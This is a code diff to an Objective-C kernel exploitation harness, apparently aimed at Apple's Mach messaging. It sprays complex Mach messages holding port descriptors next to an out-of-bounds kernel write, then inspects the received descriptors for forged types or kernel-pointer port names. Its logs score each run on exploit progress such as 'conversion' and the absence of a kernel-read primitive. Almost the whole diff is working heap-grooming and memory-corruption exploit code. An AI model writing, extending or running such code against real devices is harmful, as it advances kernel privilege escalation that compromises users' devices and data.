@@ -44,7 +44,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P073_BUILD @"p073-second-table-v6-freshinstance"
+#define P073_BUILD @"p073-second-table-v7-portkind"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -245,6 +245,104 @@ static BOOL p073_send_simple(mach_port_t port, uint32_t index) {
     h->msgh_id          = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
     return mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
                     MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) == MACH_MSG_SUCCESS;
+}
+
+/* v7 port-kind band geometry (P044 v49 shape, note 181): a COMPLEX kmsg at
+   msgh_size 0x7FC (kdata=0x820, P034 contract) carrying N_PORT port
+   descriptors. All sentPost victims use this shape because two v5/v6 boots
+   (22:39, 22:59) proved the 254 fill DETERMINISTICALLY lands its first OOB
+   records (192..195, flags 0xc0..0xc3) at the chunk adjacent to the sentPost
+   band, i.e. body+0..0x40 — exactly the desc region (body+0x04..0x64). The
+   spilled record bytes = forged descriptor dispositions/types in kernel
+   memory; the recv-side processing of those descs is the conversion door. */
+#define P073_N_DESC (8u)
+#define P073_PORT_BODY_OFF (sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t))
+
+static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
+    uint8_t buf[P073_MSG_SIZE];
+    memset(buf, 0xA5, sizeof(buf));
+    mach_msg_header_t *h = (mach_msg_header_t *)buf;
+    mach_msg_body_t *b = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
+    b->msgh_descriptor_count = P073_N_DESC;
+    /* descs: COPY_SEND rights for the victim port itself — held rights come
+       home unchanged on recv (unless the fill forged them) */
+    for (uint32_t i = 0; i < P073_N_DESC; i++) {
+        mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)
+            (buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + i * sizeof(mach_msg_port_descriptor_t));
+        d->name        = port;
+        d->disposition = MACH_MSG_TYPE_COPY_SEND;
+        d->type        = MACH_MSG_TYPE_PORT_NAME;
+    }
+    uint8_t *payload = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)
+                     + P073_N_DESC * sizeof(mach_msg_port_descriptor_t);
+    memcpy(payload, "P073P", 5);
+    uint32_t tag = index ^ P073_MAGIC;
+    memcpy(payload + 8, &tag, 4);
+    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    h->msgh_size = P073_MSG_SIZE;
+    h->msgh_remote_port = port;
+    h->msgh_local_port = MACH_PORT_NULL;
+    h->msgh_id = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
+    return mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
+                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) == MACH_MSG_SUCCESS;
+}
+
+/* recv one port-kind victim; -1 = processed with evidence (smash seen),
+    0 = gone/timeout, 1 = clean */
+static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
+    uint8_t rbuf[P073_MSG_SIZE + 0x300];
+    memset(rbuf, 0, sizeof(rbuf));
+    mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
+    mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                                    (mach_msg_size_t)sizeof(rbuf), v->port, 0, MACH_PORT_NULL);
+    if (mr == MACH_RCV_TIMED_OUT) return 0;
+    if (mr != MACH_MSG_SUCCESS) {
+        /* kernel choked on the received complex message — if this victim was
+           fill-adjacent, the smashed descriptor region is the witness. */
+        p073_log(@"  [!] PORTKIND sentPost[%u] recv mr=0x%x (desc processing rejected/errored)",
+                 v->index, mr);
+        p073_log(@"      head bytes at +%018zx: (hexdump below)", P073_PORT_BODY_OFF);
+        uint8_t *rb = (uint8_t *)h;
+        for (uint32_t row = 0; row < 6; row++) {
+            char hx[16 * 3 + 1]; hx[0] = 0;
+            for (uint32_t k = 0; k < 16; k++)
+                snprintf(hx + k * 3, 4, "%02x ", rb[row * 16 + k]);
+            p073_log(@"      +%03x %s", row * 16, [NSString stringWithUTF8String:hx]);
+        }
+        [[P007Board shared] recordEvent:@"p073_portkind_reject"
+                                 kind:@"desc_reject"
+                               detail:[NSString stringWithFormat:@"idx=%u mr=0x%x", v->index, mr]
+                               source:@"p073"];
+        if (descForgeOut) (*descForgeOut)++;
+        return -1;
+    }
+    if (!(h->msgh_bits & MACH_MSGH_BITS_COMPLEX)) return 1;
+    uint32_t cnt = ((mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t)))->msgh_descriptor_count;
+    uint32_t forge = 0;
+    for (uint32_t i = 0; i < cnt && i < 16; i++) {
+        uint8_t *dp = rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)
+                    + i * sizeof(mach_msg_port_descriptor_t);
+        uint32_t name, disp, type;
+        memcpy(&name, dp + 0, 4);
+        memcpy(&disp, dp + 4, 4);
+        memcpy(&type, dp + 8, 4);
+        BOOL forged = (type != MACH_MSG_TYPE_PORT_NAME)
+                   || (disp != MACH_MSG_TYPE_COPY_SEND)
+                   || (name >= P073_KVA_MIN && name < P073_KVA_MAX);
+        if (forged) {
+            forge++;
+            p073_log(@"  [+] DESC FORGED sentPost[%u] desc[%u] name=0x%08x disp=0x%08x type=0x%08x",
+                     v->index, i, name, disp, type);
+        }
+    }
+    if (forge) {
+        [[P007Board shared] recordEvent:@"p073_desc_forged" kind:@"desc_type_forged"
+                                 detail:[NSString stringWithFormat:@"idx=%u forged=%u", v->index, forge]
+                                 source:@"p073"];
+        if (descForgeOut) (*descForgeOut)++;
+        return -1;
+    }
+    return 1;
 }
 
 /* recv one simple extra; 1 = clean marker, 0 = gone/timeout, -1 = MUTATED */
@@ -478,10 +576,11 @@ static NSURL *p073_model_url(NSString *name) {
         mach_port_t p = p073_make_port();
         if (p == MACH_PORT_NULL) break;
         sentPost[nPost].port = p; sentPost[nPost].index = 0x3000u | i; sentPost[nPost].alive = YES;
-        if (!p073_send_simple(p, sentPost[nPost].index)) break;
+        if (!p073_send_portkind(p, sentPost[nPost].index)) break;
         nPost++;
     }
-    p073_log(@"[+] spray: sentPre=%u holes=%u sentPost=%u (kdata=0x820 each)", nPre, nHoles, nPost);
+    p073_log(@"[+] spray: sentPre=%u holes=%u sentPost=%u PORTKIND (kdata=0x820 each, v7 desc door)",
+             nPre, nHoles, nPost);
 
     if (nHoles >= 2 && smallFP) {
 
@@ -676,8 +775,8 @@ static NSURL *p073_model_url(NSString *name) {
     uint32_t touched = p073_surface_scan(surfs, nSurf);
     p073_log(@"[D1] surface scan: %u touched of %u", touched, nSurf);
 
-    /* ---- D2 harvest: sentinel extras (safe: simple recv, payload-only) ---- */
-    uint32_t mut = 0, clean = 0;
+    /* ---- D2 harvest: sentPre payload sentinels + sentPost PORT-KIND door ---- */
+    uint32_t mut = 0, clean = 0, descForged = 0;
     for (uint32_t i = 0; i < nPre; i++) {
         if (!sentPre[i].alive) continue;
         int r = p073_harvest_one(&sentPre[i], "sentPre");
@@ -685,10 +784,11 @@ static NSURL *p073_model_url(NSString *name) {
     }
     for (uint32_t i = 0; i < nPost; i++) {
         if (!sentPost[i].alive) continue;
-        int r = p073_harvest_one(&sentPost[i], "sentPost");
-        if (r < 0) mut++; else if (r > 0) clean++;
+        uint32_t forged = 0;
+        int r = p073_harvest_portkind(&sentPost[i], &forged);
+        if (r < 0) { mut++; descForged += forged; } else if (r > 0) clean++;
     }
-    p073_log(@"[D2] sentinel harvest: mutated=%u clean=%u", mut, clean);
+    p073_log(@"[D2] sentinel harvest: mutated=%u clean=%u descForged=%u", mut, clean, descForged);
 
     /* ---- verdict ---- */
     p073_log(@"=== VERDICT ===");
@@ -697,11 +797,22 @@ static NSURL *p073_model_url(NSString *name) {
         p073_log(@"Next: identify WHICH sid landed (record dump), then passthrough model for exact control.");
         [[P007Board shared] recordEvent:@"p073_session" kind:@"conversion"
                                  detail:@"surface touched — consume signal" source:@"p073"];
+    } else if (descForged > 0) {
+        /* v7: record bytes landed in a PORT-KIND victim's descriptor region and
+           the kernel PROCESSED the forged descriptors — this is the desc_type_forged
+           bar half, evaluated on the chunk the fill demonstrably hits every boot. */
+        p073_log(@"desc DOOR HIT: %u forged descriptor word(s) processed by the kernel recv path",
+                 descForged);
+        p073_log(@"on the v7 port-kind band. Bar desc_type_forged evaluated — confirm the type");
+        p073_log(@"word class above (OOL-type/ptr) and identify WHAT the forged desc became.");
+        [[P007Board shared] recordEvent:@"p073_session" kind:@"conversion"
+                                 detail:[NSString stringWithFormat:@"descForged=%u — bar half one", descForged]
+                                 source:@"p073"];
     } else if (mut > 0) {
-        p073_log(@"occupancy HIT only (sentinel fill). Adjacency missed table_small this run.");
-        p073_log(@"conversion=NO. Bar untouched: desc_type_forged OR (body_forged AND kptr).");
+        p073_log(@"occupancy HIT only (fill landed, desc words unmodified). Adjacency still the door.");
+        p073_log(@"conversion=NO. Bar: desc_type_forged OR (body_forged AND kptr).");
         [[P007Board shared] recordEvent:@"p073_session" kind:@"occupancy"
-                                 detail:@"sentinel FILL HIT, no consume" source:@"p073"];
+                                 detail:@"fill hit, desc region intact" source:@"p073"];
     } else {
         /* v3: disambiguate MISS — no-fill is NOT an adjacency result. */
         if (!pred254Fired) {
@@ -722,10 +833,11 @@ static NSURL *p073_model_url(NSString *name) {
         }
     }
     p073_log(@"[VERDICT] kind=%s first_fail_stage=%s fires=%d ok=%d",
-             touched > 0 ? "conversion" : (mut > 0 ? "occupancy" : "miss"),
-             touched > 0 ? "none"
+             (touched > 0 || descForged > 0) ? "conversion"
+               : (mut > 0 ? "occupancy" : "miss"),
+             (touched > 0 || descForged > 0) ? "none"
                : (mut > 0 ? "adjacency" : (!pred254Fired ? "a-fill" : "b-adjacency")),
-             (int)pred254Attempts, touched > 0 ? 1 : 0);
+             (int)pred254Attempts, (touched > 0 || descForged > 0) ? 1 : 0);
     p073_log(@"hasKread=NO. kread32 registers only from a copyout of kernel bytes we did not write.");
     p073_log(@"One TAP per force-quit. Reboot if ANE/kmsg state is dirty.");
 
